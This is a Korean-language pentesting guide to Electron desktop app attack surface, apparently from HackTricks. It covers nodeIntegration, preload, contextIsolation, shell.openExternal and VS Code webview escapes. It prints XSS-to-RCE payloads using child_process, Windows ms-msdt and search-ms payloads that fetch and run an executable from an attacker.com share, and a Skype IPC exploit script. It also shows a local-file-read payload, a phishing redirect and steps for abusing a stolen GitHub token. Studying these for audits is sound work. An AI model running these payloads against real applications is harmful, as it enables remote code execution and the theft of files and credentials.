# Electron 데스크톱 앱

{{#include ../../banners/hacktricks-training.md}}

## 소개

Electron은 권한이 부여된 **Node.js** 메인 프로세스와 **Chromium** 렌더러 프로세스를 결합합니다. Electron은 웹 브라우저가 아닙니다. 애플리케이션 코드가 파일 시스템 및 셸 접근과 같은 기능을 의도적으로 노출할 수 있으므로, 신뢰할 수 없는 콘텐츠를 로드할 때는 일반 웹사이트보다 더 엄격한 경계 설계가 필요합니다.<sup>[[21]](#references)</sup>

Electron 애플리케이션 코드는 흔히 `.asar` 아카이브로 패키징됩니다. 소스 코드를 검토하기 전에 압축을 해제하세요:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

애플리케이션의 `package.json`에는 기본 진입점이 지정되어 있습니다. 해당 파일은 일반적으로 renderer 창을 만들고 보안에 민감한 `webPreferences`를 설정합니다.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron에는 두 가지 주요 프로세스 유형이 있습니다:

- Main Process (NodeJS에 완전히 접근할 수 있음)
- Renderer Process (보안상의 이유로 NodeJS 접근이 제한되어야 함)

![Electron 데스크톱 앱 - 소개: Renderer Process (보안상의 이유로 NodeJS 접근이 제한되어야 함)](<../../images/image (182).png>)

**renderer process**는 파일을 로드하는 브라우저 창입니다:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**메인 프로세스**는 일반적으로 `BrowserWindow`를 생성할 때 각 렌더러 프로세스를 구성합니다. 보안 설정은 렌더러가 침해되었을 때 네이티브 코드 실행으로 이어질 가능성을 낮추지만, 신뢰할 수 없는 콘텐츠 자체를 안전하게 만들지는 않습니다.<sup>[[21]](#references)[[22]](#references)</sup>

최소한 다음 렌더러 설정을 검토하세요:<sup>[[22]](#references)</sup>

- **`nodeIntegration`**은 기본적으로 `false`입니다. 활성화하면 렌더러 JavaScript가 Node.js API에 접근할 수 있으며, 해당 렌더러의 샌드박스도 비활성화됩니다.
- **`contextIsolation`**은 기본적으로 `true`입니다. 페이지의 JavaScript 컨텍스트와 preload 스크립트 및 Electron 내부에서 사용하는 컨텍스트를 분리합니다.
- **`preload`**에는 기본 경로가 없습니다. 설정된 preload 스크립트는 페이지 스크립트보다 먼저 실행되며, `contextBridge`를 통해 범위가 제한된 API를 노출할 수 있습니다.
- **`sandbox`**는 Electron 20부터 기본적으로 `true`입니다. 렌더러가 운영 체제 리소스에 접근하는 것을 제한합니다. `nodeIntegration: true`로 설정하면 샌드박스가 비활성화됩니다.
- **`nodeIntegrationInWorker`**는 기본적으로 `false`이며 Web Workers에서 Node.js 통합을 제어합니다.
- **`nodeIntegrationInSubFrames`**는 기본적으로 `false`입니다.
  - **`nodeIntegration`**이 **활성화**되어 있으면 Electron 애플리케이션 내의 **iframe에 로드된** 웹 페이지에서 **Node.js API**를 사용할 수 있습니다.
  - **`nodeIntegration`**이 **비활성화**되어 있으면 preload는 iframe에서 로드됩니다.

설정 예시:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

[여기](https://7as.es/electron/nodeIntegration_rce.txt)에서 가져온 **RCE payloads** 일부:<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### 트래픽 캡처

start-main 설정을 수정하고 다음과 같이 프록시 사용을 추가합니다:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REA를 사용한 정적 ASAR-to-native 경계 추적

**REA**는 JavaScript bootstrap을 실행하지 않고 ASAR 또는 추출된 애플리케이션 디렉터리를 읽을 수 있습니다. 애플리케이션 그래프에는 패키지 진입점, 번들 모듈, `BrowserWindow` 및 preload 설정, `contextBridge` 멤버, IPC 등록, native add-on 요청, 소스 맵 식별자가 기록됩니다. 이를 시작점으로 삼아 renderer에 노출된 기능을 권한이 높은 main-process 핸들러까지 추적할 수 있습니다.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

리터럴 feature 문자열의 경우, 전체 Evidence 레코드를 `application`으로 전달하고 seed를 대상에서 관찰한 값으로 바꾸세요:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

동일한 `trace_application_feature` workflow는 관찰된 리터럴 API 멤버, IPC 채널 또는 모듈을 시드로도 받습니다. 반환된 소스 위치를 기준으로 결과 핸들러 경로, 검증 후보 및 native handoff를 확인하세요. renderer의 `invoke`는 동일한 정확한 리터럴 채널을 사용하는 하나의 고유한 `ipcMain.handle`/`handleOnce` 후보와만 짝을 이룹니다. `send`도 마찬가지로 하나의 고유한 `ipcMain.on`/`once`/`addListener` 후보가 필요합니다. 동적이거나 중복된 핸들러는 미해결 상태로 남습니다. 요청된 `.node` 멤버는 검증된 native export가 아닙니다. 이 결론을 내리려면 일치하는 Hopper/Ghidra 증거의 artifact digest가 같아야 합니다. 정적 도달 가능성만으로 해당 경로가 실행되었음을 입증할 수도 없습니다.<sup>[[24]](#references)[[25]](#references)</sup>

renderer-to-main 신뢰 경계 및 핸들러 검증에 대해서는 [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md)를 참조하세요.

provider에 바인딩된 native 후속 조사에 대해서는 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea)를 참조하세요.

## Electron 자동 업데이트 공격 표면

릴리스 피드 무결성, 롤백, 서명된 채널 혼동 및 스테이징 파일 TOCTOU에 대해서는 [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md)를 참조하세요.

## Electron 로컬 코드 인젝션

설치된 앱에 대한 로컬 쓰기 또는 계측 접근 권한이 있다면 ASAR/main-process 및 V8 snapshot 경로와 OS별 링크에 관해서는 [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md)를 참조하세요.

## RCE: XSS + nodeIntegration

**nodeIntegration**이 **on**으로 설정되어 있으면 웹 페이지의 JavaScript는 `require()`를 호출하는 것만으로 Node.js 기능을 쉽게 사용할 수 있습니다. 예를 들어 Windows에서 calc 애플리케이션을 실행하는 방법은 다음과 같습니다.

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

이 설정에 지정된 스크립트는 **렌더러의 다른 스크립트보다 먼저 로드되므로**, **Node API에 무제한으로 접근할 수 있습니다**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

따라서 스크립트는 node-features를 페이지로 내보낼 수 있습니다:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **`contextIsolation`이 켜져 있으면 작동하지 않습니다**

## RCE: XSS + contextIsolation

_**contextIsolation**_은 **웹 페이지 스크립트와 Electron 내부 코드의 JavaScript 사이에 분리된 컨텍스트를 도입**하여 각 코드의 JavaScript 실행이 서로에게 영향을 주지 않도록 합니다. 이는 RCE 가능성을 없애기 위해 필요한 기능입니다.

컨텍스트가 격리되지 않았다면 공격자는 다음을 수행할 수 있습니다.

1. **renderer에서 임의의 JavaScript 실행** (XSS 또는 외부 사이트로 이동)
2. preload 또는 Electron 내부 코드에서 사용하는 **내장 메서드를 덮어써** 자신의 함수로 대체
3. **덮어쓴 함수가 사용되도록 유도**
4. RCE?

내장 메서드를 덮어쓸 수 있는 곳은 두 군데입니다. preload 코드 또는 Electron 내부 코드입니다.


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### 클릭 이벤트 우회

링크를 클릭할 때 제한이 적용된다면, 일반적인 왼쪽 클릭 대신 **가운데 클릭**하여 우회할 수 있습니다.

```javascript
window.addEventListener('click', (e) => {
```

## shell.openExternal을 통한 RCE

이 예시에 대한 자세한 내용은 [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) 및 [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>를 확인하세요.

Electron 데스크톱 애플리케이션을 배포할 때 `nodeIntegration` 및 `contextIsolation` 설정을 올바르게 구성하는 것이 중요합니다. 이러한 설정을 적용하면 메인 프로세스에서 preload scripts 또는 Electron의 네이티브 코드를 대상으로 하는 **클라이언트 측 원격 코드 실행(RCE)**을 사실상 방지할 수 있습니다.

사용자가 링크와 상호작용하거나 새 창을 열면 특정 이벤트 리스너가 트리거되며, 이는 애플리케이션의 보안과 기능에 매우 중요합니다:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

이러한 리스너는 자체 **비즈니스 로직**을 구현하기 위해 **데스크톱 애플리케이션에서 재정의**됩니다. 애플리케이션은 탐색한 링크를 내부에서 열지, 외부 웹 브라우저에서 열지 판단합니다. 일반적으로 이 판단은 `openInternally` 함수를 통해 이루어집니다. 이 함수가 `false`를 반환하면 `shell.openExternal` 함수를 사용해 링크를 외부에서 열어야 한다는 뜻입니다.

**간략화한 의사 코드:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS 보안 모범 사례에서는 신뢰할 수 없는 콘텐츠에 `openExternal` 함수를 사용하지 말 것을 권고합니다. 다양한 프로토콜을 통해 RCE로 이어질 수 있기 때문입니다. 운영 체제는 RCE를 유발할 수 있는 여러 프로토콜을 지원합니다. 이 주제에 대한 자세한 예시와 설명은 [이 자료](https://positive.security/blog/url-open-rce#windows-10-19042)를 참조하세요. 이 자료에는 해당 취약점을 악용할 수 있는 Windows 프로토콜 예시가 포함되어 있습니다.<sup>[[10]](#references)</sup>

macOS에서는 `shell.openExternal('file:///System/Applications/Calculator.app')`처럼 `openExternal` 함수를 악용해 임의의 명령을 실행할 수 있습니다.

**Windows 프로토콜 악용 예시:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

이 취약점은 **[이 보고서](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**에서 확인할 수 있습니다.<sup>[[11]](#references)</sup>

**webviewTag**는 **NodeJS**를 **renderer process**에서 사용할 수 있게 하는 **deprecated feature**입니다. preload context 내부에서 스크립트를 로드할 수 있으므로 비활성화해야 합니다. 예를 들면 다음과 같습니다:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

따라서 임의의 페이지를 로드하는 데 성공한 공격자는 해당 태그를 사용해 **임의의 preload script를 로드**할 수 있습니다.

이후 이 preload script를 악용해 **취약한 IPC 서비스(`skype-new-window`)**를 호출했습니다. 이 서비스는 **`shell.openExternal`**을 호출해 RCE를 유발했습니다:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## 내부 파일 읽기: XSS + contextIsolation

**`contextIsolation`을 비활성화하면 `<webview>` 태그를 사용할 수 있으며**, 이는 `<iframe>`과 유사하게 로컬 파일을 읽고 유출하는 데 사용할 수 있습니다. 제공된 예시는 이 취약점을 악용해 내부 파일의 내용을 읽는 방법을 보여줍니다:<sup>[[2]](#references)</sup>

![RCE: webviewTag + 취약한 preload IPC + shell.openExternal - 내부 파일 읽기: XSS + contextIsolation: contextIsolation을 비활성화하면 태그를 사용할 수 있으며, 와 유사하게, ...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

또한 **내부 파일을 읽는** 다른 방법도 소개하며, Electron 데스크톱 앱의 심각한 로컬 파일 읽기 취약점을 강조합니다. 여기에는 애플리케이션을 악용하고 데이터를 유출하기 위해 스크립트를 삽입하는 과정이 포함됩니다:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + 오래된 Chromium**

애플리케이션에 번들로 포함된 **Chromium** 버전이 오래되었고 알려진 취약점이 있다면, 이를 악용해 XSS를 RCE로 전환할 수 있습니다.<sup>[[20]](#references)</sup>\
이 **writeup**에서 예시를 확인할 수 있습니다: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Internal URL regex bypass를 통한 XSS 피싱**

XSS를 찾았지만 **RCE를 트리거하거나 내부 파일을 훔칠 수 없다면**, **피싱을 통해 자격 증명을 훔치는 방법**을 시도해 볼 수도 있습니다.<sup>[[1]](#references)</sup>

먼저 프런트엔드 코드를 살펴보고 새 URL을 열 때 어떤 일이 발생하는지 확인합니다:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** 호출은 플랫폼 링크를 **desktop window**에서 열지, 타사 리소스를 시스템 브라우저에서 열지 결정합니다.

함수의 URL allowlist 정규식을 우회할 수 있다면(예: 호스트 이름의 점을 이스케이프하지 않은 경우), 공격자는 XSS를 악용해 공격자가 제어하는 인프라에 그럴듯한 자격 증명 입력창을 띄울 수 있습니다:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` 프로토콜

[Electron 보안 가이드](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols)에 언급된 것처럼, **`file://`**에서 실행되는 페이지는 광범위한 파일 접근 권한을 받습니다. 따라서 **XSS를 이용해** 사용자의 컴퓨터에서 임의의 파일을 로드할 수 있습니다. 올바르게 설계된 **커스텀 프로토콜**을 사용하면 특정 파일 집합으로 접근을 제한할 수 있습니다.<sup>[[21]](#references)</sup>

## Remote 모듈

Electron Remote 모듈을 사용하면 **렌더러 프로세스가 메인 프로세스 API에 접근**할 수 있어 Electron 애플리케이션 내 통신이 쉬워집니다. 하지만 이 모듈을 활성화하면 상당한 보안 위험이 발생합니다. 애플리케이션의 공격 표면이 확대되어 크로스 사이트 스크립팅(XSS) 공격과 같은 취약점에 더 쉽게 노출됩니다.

> [!TIP]
> **remote** 모듈은 메인 프로세스의 일부 API를 렌더러 프로세스에 노출하지만, 해당 컴포넌트만 악용해 RCE를 얻는 것은 간단하지 않습니다. 다만 컴포넌트가 민감한 정보를 노출할 수는 있습니다.

> [!WARNING]
> 아직 remote 모듈을 사용하는 많은 앱은 렌더러 프로세스에서 NodeIntegration을 활성화해야 작동합니다. 이는 **매우 큰 보안 위험**입니다.

Electron에 내장된 `remote` 모듈은 사용 중단된 후 제거되었습니다. 여전히 해당 모델이 필요한 애플리케이션은 별도의 `@electron/remote` 패키지를 사용할 수 있습니다. 보안 및 성능에 미치는 영향을 고려해, 신뢰할 수 없는 렌더러에 remote 방식의 기능을 노출하지 마세요.

`@electron/remote`를 사용하려면 먼저 **메인 프로세스에서 초기화**해야 합니다:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

renderer 프로세스는 모듈에서 객체를 가져올 수 있습니다:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[블로그 게시물](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**에서는 remote 모듈의 **`app`** 객체가 노출하는 몇 가지 흥미로운 **함수**를 소개합니다:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - 현재 인스턴스를 **종료**하고 새 인스턴스를 **실행**하여 애플리케이션을 **다시 시작**합니다. **앱 업데이트**나 중요한 **상태 변경**에 유용합니다.
- **`app.setAppLogsPath([path])`**  
   - **앱 로그**를 저장할 디렉터리를 **지정**하거나 **생성**합니다. **`app.getPath()`** 또는 **`app.setPath(pathName, newPath)`**를 사용해 로그를 **가져오거나** **수정**할 수 있습니다.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - 현재 실행 파일을 지정된 **프로토콜**의 **기본 처리기**로 **등록**합니다. 필요한 경우 **사용자 지정 경로**와 **인수**를 지정할 수 있습니다.
- **`app.setUserTasks(tasks)`**  
   - (Windows에서) **Jump List**의 **작업 범주**에 작업을 **추가**합니다. 각 작업은 앱을 **실행**하는 방식이나 전달할 **인수**를 제어할 수 있습니다.
- **`app.importCertificate(options, callback)`**  
   - **PKCS#12 인증서**를 시스템의 **인증서 저장소**로 **가져옵니다**(Linux 전용). 결과 처리를 위해 **콜백**을 사용할 수 있습니다.
- **`app.moveToApplicationsFolder([options])`**  
   - 애플리케이션을 (macOS의) **Applications 폴더**로 **이동**합니다. Mac 사용자를 위한 **표준 설치**를 보장하는 데 도움이 됩니다.
- **`app.setJumpList(categories)`**  
   - (Windows에서) **사용자 지정 Jump List**를 **설정**하거나 **제거**합니다. 사용자에게 작업이 표시되는 방식을 구성하기 위해 **범주**를 지정할 수 있습니다.
- **`app.setLoginItemSettings(settings)`**  
   - **로그인**할 때 함께 실행되는 **실행 파일**과 해당 **옵션**을 **구성**합니다(macOS 및 Windows 전용).
  
예시:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences 모듈

Electron에서 시스템 환경설정에 접근하고 **시스템 이벤트를 발생시키는** **주요 API**입니다. **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, **setUserDefault** 같은 메서드는 모두 이 모듈에 **포함되어 있습니다**.

**사용 예시:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **NSDistributedNotificationCenter를 사용해 native macOS notifications를 수신**합니다.  
* **macOS Catalina** 이전에는 CFNotificationCenterAddObserver에 **nil**을 전달해 **모든** distributed notifications를 스니핑할 수 있었습니다.  
* **Catalina / Big Sur** 이후에도 sandboxed apps는 notifications를 **이름별로** 등록해 **여러 이벤트**(예: **화면 잠금/해제**, **볼륨 마운트**, **네트워크 활동** 등)를 **구독**할 수 있습니다.

### **getUserDefault / setUserDefault**

* macOS에서 **application** 또는 **global** preferences를 저장하는 **NSUserDefaults와 연동**합니다.
    
* **getUserDefault**는 **최근 파일 위치**나 **사용자의 지리적 위치**와 같은 민감한 정보를 **가져올** 수 있습니다.
    
* **setUserDefault**는 이러한 preferences를 **수정**해 앱의 **configuration**에 영향을 줄 수 있습니다.
    
* **이전 Electron 버전**(v8.3.0 이전)에서는 NSUserDefaults의 **standard suite**만 **접근**할 수 있었습니다.

## Shell.showItemInFolder

이 함수는 지정된 파일을 파일 관리자에서 표시합니다. 영향을 받는 플랫폼과 버전에서는 이 동작으로 인해 **파일이 자동으로 실행될 수 있었습니다**.

자세한 내용은 [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>를 확인하세요.

## Content Security Policy

Electron 앱에는 **XSS 공격을 방지**하기 위한 **Content Security Policy (CSP)**가 있어야 합니다. **CSP**는 브라우저에서 **신뢰할 수 없는 코드의 실행을 방지**하는 데 도움이 되는 **보안 표준**입니다.

일반적으로 **`main.js`** 파일이나 CSP가 **meta tag** 안에 포함된 **`index.html`** 템플릿에서 **설정**합니다.

자세한 내용은 다음을 확인하세요:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage 신뢰 + 로컬 파일 로딩 (VS Code 1.63)

이 실제 공격 체인은 Visual Studio Code 1.63 (CVE-2021-43908)에 영향을 미쳤으며, CSP, postMessage, scheme handlers가 잘못 설정된 경우 webview의 단일 markdown 기반 XSS가 어떻게 full RCE로 확대될 수 있는지 보여 줍니다. 공개 PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

공격 체인 개요
- webview CSP를 통한 첫 번째 XSS: 생성된 CSP에 `style-src 'self' 'unsafe-inline'`이 포함되어 있어 `vscode-webview://` 컨텍스트에서 inline/style 기반 injection이 가능했습니다. payload는 `/stealID`로 beacon을 보내 대상 webview의 extensionId를 유출했습니다.
- 대상 webview URL 구성: 유출된 ID를 사용해 `vscode-webview://<extensionId>/.../<publicUrl>`을 구성합니다.
- postMessage 신뢰를 통한 두 번째 XSS: 외부 webview는 엄격한 origin/type 검사 없이 `window.postMessage`를 신뢰했고, `allowScripts: true`로 공격자 HTML을 로드했습니다.
- scheme/path 재작성으로 로컬 파일 로딩: payload는 `file:///...`을 `vscode-file://vscode-app/...`으로 재작성하고 `exploit.md`를 `RCE.html`로 바꿔, 취약한 path validation을 악용해 권한이 높은 로컬 리소스를 로드했습니다.
- Node가 활성화된 컨텍스트에서 RCE: 로드된 HTML은 Node APIs를 사용할 수 있는 상태로 실행되어 OS command execution으로 이어졌습니다.

최종 컨텍스트의 RCE 기본 요소 예시
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Related reading on postMessage trust issues:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: 합성 webview 단축키 + 선언적 extension 명령 브리지

2026년 6월, VS Code webview 탈출의 또 다른 유형이 등장했습니다. notebook/preview webview 내의 **신뢰할 수 없는 JavaScript가 권한이 있는 전역 단축키를 합성할 수 있었습니다.** webview preload가 `keydown` 데이터를 호스트 workbench로 전달하고, 호스트가 이를 실제 사용자 입력으로 처리했기 때문입니다.<sup>[[14]](#references)</sup>

이는 프로젝트가 제어하는 콘텐츠가 권한이 있는 편집기 기능에 도달하는 IDE 신뢰 경계 공격의 더 광범위한 흐름의 일부입니다.<sup>[[19]](#references)</sup>

### 경계 실패

cross-origin/sandboxed webview가 공격자가 제어하는 키보드 필드(`key`, `code`, `keyCode`, modifiers, `repeat`)를 **`event.isTrusted`를 확인하지 않고** 권한이 있는 `postMessage`/message-port 브리지에 복사하면, webview 내부의 JavaScript가 workbench 단축키를 실행할 수 있습니다.<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

브라우저에서 **synthetic typing이 차단될 때** 특히 유용합니다. 스크립트로 생성한 키 이벤트는 보통 HTML `<input>` 요소에 임의의 텍스트를 **입력할 수 없지만**, `keydown`을 직접 처리하는 단축키는 여전히 트리거할 수 있습니다.

### 실용적인 악용 패턴

- **단축키 중심 UI 악용:** 명령어를 입력하려 하지 말고 알림 수락, 팔레트 탐색, 포커스된 버튼 활성화 또는 메뉴 이동과 같은 전역 바인딩을 노립니다.
- **workspace 메타데이터를 이용해 예측 가능한 권한 있는 프롬프트 생성:** 저장소에서 제어하는 `.vscode/extensions.json`으로 공격자 확장 프로그램을 추천하고, `Ctrl+Shift+A`와 같은 단축키로 수락할 수 있는 예측 가능한 설치 알림을 생성할 수 있습니다.
- **명령어 브리지로 사용하는 선언형 확장 프로그램 매니페스트:** web VS Code에서 로컬 workspace 확장 프로그램 코드가 CSP에 의해 차단되더라도, 선언형 `package.json` 기여 항목은 여전히 로드될 수 있습니다. `.vscode/extensions` 아래의 로컬 확장 프로그램은 `runCommands`를 호출하는 키 바인딩을 등록한 뒤 `workbench.extensions.installExtension`과 같은 권한 있는 내부 명령을 호출할 수 있습니다.<sup>[[14]](#references)[[18]](#references)</sup>

매니페스트 패턴 예시:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **신뢰할 수 없는 메타데이터를 통해 접근 가능한 숨겨진 보안 플래그:** 내부 명령이 `{"context":{"skipPublisherTrust":true}}`와 같은 공격자 제어 인수를 받으면, 선언적 메타데이터로 신뢰 대화상자를 억제하고 Marketplace/CDN에서 호스팅되는 확장 프로그램을 설치해 최종적으로 공격자 코드를 실행할 수 있습니다.
- **신뢰된 작업 공간 악용:** 원격/웹 작업 공간이 자동으로 신뢰되는 경우, 로컬 작업 공간 확장 프로그램은 저장소 콘텐츠에서 권한 있는 편집기 작업으로 이어지는 고가치 경로가 됩니다.
- **침해 후 범위 확대:** 확장 프로그램이 실행된 후에는 편집기가 확장 프로그램에 어떤 토큰을 제공하는지 확인하세요. `github.dev`에서는 탈취한 GitHub 토큰이 열린 저장소 범위를 넘어 유효했으므로, `https://api.github.com/user/repos`를 쿼리해 추가로 접근 가능한 비공개 저장소를 열거할 수 있었습니다.

### 감사 참고 사항

- **webview에서 호스트로 입력 전달**을 권한 경계로 취급하세요. 신뢰할 수 없는 프레임에서 발생한 합성 키/클릭 이벤트를 호스트로 다시 전달하지 마세요.
- 민감한 명령 내부에서 권한을 확인하세요. `skipPublisherTrust`와 같은 내부 플래그를 설정할 수 있는 호출자 제공 명령 컨텍스트를 허용하지 마세요.
- 실행 가능한 로컬 확장 프로그램 코드를 차단하는 것만으로 충분하다고 가정하지 마세요. 작업 공간이 제어하는 매니페스트의 **선언적 기여 항목**(`keybindings`, `menus`, `commands`, 작업)도 검토하세요.
- 2026년 6월 3일 수정 사항에서는 전달되는 이벤트에 `isTrusted`를 추가하고, 노트북 webview에서 신뢰할 수 없는 키 전달을 비활성화했으며, 호출자가 제공하는 설치 명령 컨텍스트를 더 이상 허용하지 않도록 변경했습니다.<sup>[[16]](#references)[[17]](#references)</sup>

## **도구**

엄선된 **awesome-electronjs-hacking** 컬렉션에서 추가 연구 자료, 도구 및 취약한 애플리케이션 리소스를 확인할 수 있습니다.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity)는 Electron 기반 애플리케이션의 잘못된 구성과 보안 안티패턴을 식별하는 도구입니다.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint)는 Electronegativity를 사용하는 Electron 애플리케이션용 오픈 소스 VS Code 플러그인입니다.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)은 취약한 서드파티 라이브러리를 검사합니다.
- [**Electro.ng**](https://electro.ng/)는 상용 Electron 보안 분석 도구입니다.

## 실습

